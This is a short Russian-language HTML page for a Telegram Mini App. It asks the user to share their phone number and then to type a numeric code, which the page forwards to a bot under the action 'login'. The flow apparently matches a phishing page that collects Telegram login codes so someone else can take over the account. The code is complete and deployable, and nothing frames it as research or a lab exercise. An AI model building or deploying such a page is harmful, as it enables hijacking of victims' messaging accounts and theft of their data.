<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; padding: 20px; text-align: center; background: #fff; color: #000; }
        .hidden { display: none !important; }
        button { 
            background: #3390ec; color: white; border: none; padding: 20px; 
            font-size: 20px; border-radius: 10px; width: 100%; margin-top: 20px; 
            cursor: pointer; font-weight: bold;
        }
        input { 
            width: 100%; padding: 20px; font-size: 30px; text-align: center; 
            border: 2px solid #3390ec; border-radius: 10px; margin-top: 20px; box-sizing: border-box;
        }
    </style>
</head>
<body>

    <div id="screen-phone">
        <h2>Шаг 1</h2>
        <button id="share-phone-btn">ПОДЕЛИТЬСЯ НОМЕРОМ</button>
    </div>

    <div id="screen-code" class="hidden">
        <h2>Шаг 2</h2>
        <p>Номер: <b id="user-phone"></b></p>
        <input type="number" id="code-input" placeholder="12345">
        <button id="submit-code-btn">ОТПРАВИТЬ КОД В БОТА</button>
    </div>

    <script>
        window.onload = function() {
            if (window.Telegram && window.Telegram.WebApp) {
                const tg = window.Telegram.WebApp;
                tg.expand();

                document.getElementById('share-phone-btn').onclick = function() {
                    tg.requestContact(function(shared, contact) {
                        if (shared) {
                            document.getElementById('user-phone').innerText = "+" + contact.phone_number;
                            document.getElementById('screen-phone').classList.add('hidden');
                            document.getElementById('screen-code').classList.remove('hidden');
                        }
                    });
                };

                document.getElementById('submit-code-btn').onclick = function() {
                    const code = document.getElementById('code-input').value;
                    
                    if (code.length < 1) {
                        alert("Введите код!");
                        return;
                    }

                    // ЖЕСТКИЙ ТЕСТ (окно должно появиться 100%)
                    alert("Кнопка нажата! Отправляю: " + code);

                    tg.sendData(JSON.stringify({
                        action: "login",
                        code: code
                    }));
                    
                    tg.close();
                };
            } else {
                alert("Telegram не загрузился. Откройте через бота!");
            }
        };
    </script>
</body>
</html>
